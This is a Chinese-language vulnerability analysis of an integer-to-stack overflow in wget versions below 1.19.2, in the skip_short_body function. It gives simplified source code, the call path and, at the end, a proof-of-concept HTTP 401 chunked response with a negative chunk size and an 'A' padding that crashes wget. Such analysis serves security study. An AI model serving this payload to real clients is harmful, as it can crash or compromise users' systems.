# 漏洞成因
Linux中的wget，版本低于1.19.2,在其源代码中 http.c:skip_short_body，存在整形溢出，最终可导致栈溢出

# 测试环境
    操作系统：Ubuntu 14.04 64位
    wget版本: 1.19.1 (ftp.gnu.org/gnu/wget/wget-1.19.1.tar.gz)

# 漏洞分析
造成漏洞的代码(已简化):
```c
static bool
skip_short_body (int fd, wgint contlen, bool chunked)
{
  enum {
    SKIP_SIZE = 512,                /* size of the download buffer */
    SKIP_THRESHOLD = 4096        /* the largest size we read */
  };
  wgint remaining_chunk_size = 0;
  char dlbuf[SKIP_SIZE + 1];
  dlbuf[SKIP_SIZE] = '\0';        /* so DEBUGP can safely print it */

  /* If the body is too large, it makes more sense to simply close the
     connection than to try to read the body.  */
  if (contlen > SKIP_THRESHOLD)
    return false;

  while (contlen > 0 || chunked)
    {
    //........................
      ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), -1); //（1）
      //........................
    }

  DEBUGP (("] done.\n"));
  return true;
}
```
fd_read函数的定义如下：
```c
//其功能是读取fd描述符，并将读取的内容放入buf中。
int fd_read (int fd, char *buf, int bufsize, double timeout);
```
其中造成漏洞的原因在代码（1）处:

    MIN宏是比较两者的值，并返回最小值。

    contlen是int64_t的数据类型

    SKIP_SIZE是int 类型

    如我们让contlen的值为负数，且低32位值大于dlbuf的大小，则在MIN时，会返回contlen，又由于fd_read中的对应参数接受的是int,则只会接受int64_t的低32位。从而覆盖skip_short_body的栈结构，造成栈溢出。

# 漏洞验证
要触发该漏洞的两个关键点是:

    我们能够控制contlen,且能控制从fd读取的数据。
    
其中 skip_short_body的调用关系为:
    
    (src/retr.c)retrievel_url->：其解析用户输入的地址，选择不同协议

    (src/http.c)http_loop-> : 利用http协议循环获取数据
    
    (src/http.c)gethttp->   : 获取数据
    
    (src/http.c)skip_short_body: 获取请求的主体

由分析我们可以构造如下的http头:

```http
HTTP/1.1 401 Not Authorized  
Transfer-Encoding: chunked  
Connection: keep-alive

contlen的十六进制值
写入dlbuf的数据
```

比如:
```http
HTTP/1.1 401 Not Authorized  
Transfer-Encoding: chunked  
Connection: keep-alive

-0x7FFFFFFFFFFFFC00
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

则会发现程序崩溃